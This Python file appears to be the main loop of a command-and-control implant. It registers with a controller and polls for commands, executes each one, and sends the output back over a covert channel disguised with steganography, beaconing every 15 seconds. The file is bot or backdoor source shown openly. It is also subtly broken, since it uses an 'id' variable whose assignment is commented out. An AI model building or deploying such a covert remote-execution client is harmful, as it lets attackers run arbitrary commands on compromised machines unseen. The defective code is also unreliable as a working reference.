import time
from .client.client import CCClient
from ccchanel.ccchanel_file import CCChanelFile
from ccchanel.log import log_append
from steno.steno_base import CCStenoBase
from .client import payloads as cpayload


def main():
    client = CCClient(CCChanelFile, CCStenoBase)
    sleep_time = 15
    # id = cid.id()
    if not client.is_registered():
        client.register()
    client.tell_alive()
    while True:
        cmd = client.get_command()
        if cmd is not None:
            cmd_id = cmd['timestamp']
            exec_out = client.execute_command(cmd['kind'], *cmd['args']).decode()
            log_append(client.ccchanel, '/' + id, cpayload.done_create(cmd_id, exec_out), client.steno_base)
        print(f"SLEEP {sleep_time}")
        time.sleep(sleep_time)
        log_append(client.ccchanel, '/' + id, cpayload.ping_create(), client.steno_base)


if __name__ == "__main__":
    main()
